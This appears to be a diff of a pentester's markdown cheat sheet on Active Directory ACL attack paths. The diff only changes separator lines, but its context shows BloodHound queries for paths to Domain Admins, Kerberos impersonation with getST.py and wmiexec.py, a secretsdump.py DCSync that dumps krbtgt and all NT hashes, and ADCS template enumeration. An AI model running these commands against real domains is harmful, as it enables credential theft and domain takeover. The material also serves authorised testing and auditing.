@@ -17,7 +17,7 @@ linked:
 ---
 # AD - ACL Enumeration - ACL Path Patterns
 
-***
+---
 
 ## Direct Privesc Paths
 
@@ -39,7 +39,7 @@ MATCH p=shortestPath((u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceCha
 RETURN p
 ```
 
-___
+---
 
 ## Group Membership Chains
 
@@ -50,7 +50,7 @@ ___
 | `MATCH p=shortestPath((u {owned:true})-[*1..6]->(da:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p` | Shortest path a DA | Standard. |
 ^ad-aclpath-groups
 
-___
+---
 
 ## OU + GPO Chains
 
@@ -62,7 +62,7 @@ ___
 | `Get-GPO -All \| % { Get-GPPermission -Guid $_.Id -All }` | DACL per-GPO | RSAT audit. |
 ^ad-aclpath-ougpo
 
-___
+---
 
 ## Computer ACL → Lateral
 
@@ -93,7 +93,7 @@ getST.py -spn cifs/<target> -impersonate Administrator -dc-ip <DC> \
 KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass corp.local/Administrator@<target>
 ```
 
-___
+---
 
 ## DCSync Path
 
@@ -109,7 +109,7 @@ secretsdump.py corp.local/atacante:pass@<DC> -just-dc
 # Output: krbtgt + all NT hashes
 ```
 
-___
+---
 
 ## ADCS ESC1-ESC15 Paths
 
@@ -121,7 +121,7 @@ ___
 | `Certify.exe find /vulnerable` | Windows | Standard. |
 ^ad-aclpath-adcs
 
-___
+---
 
 ## Anti-Patterns (Avoid False Positives)
 
@@ -133,7 +133,7 @@ ___
 | BloodHound `WHERE NOT u.objectid CONTAINS '-512' AND NOT u.objectid CONTAINS '-519'` | Exclude DA/EA SIDs | Standard exclusions. |
 ^ad-aclpath-antipatterns
 
-___
+---
 
 ## Owns Edge (Ownership)
 
@@ -146,7 +146,7 @@ ___
 
 **Ownership = implicit Modify Permissions** = grant self GenericAll. Owners no aparecen en `Find-InterestingDomainAcl` default — chequear separadamente.
 
-___
+---
 
 ## Cypher Workhorse Queries
 
@@ -181,4 +181,4 @@ RETURN u.name,u.lastlogon
 ```
 ^ad-aclpath-cypher
 
-***
+---
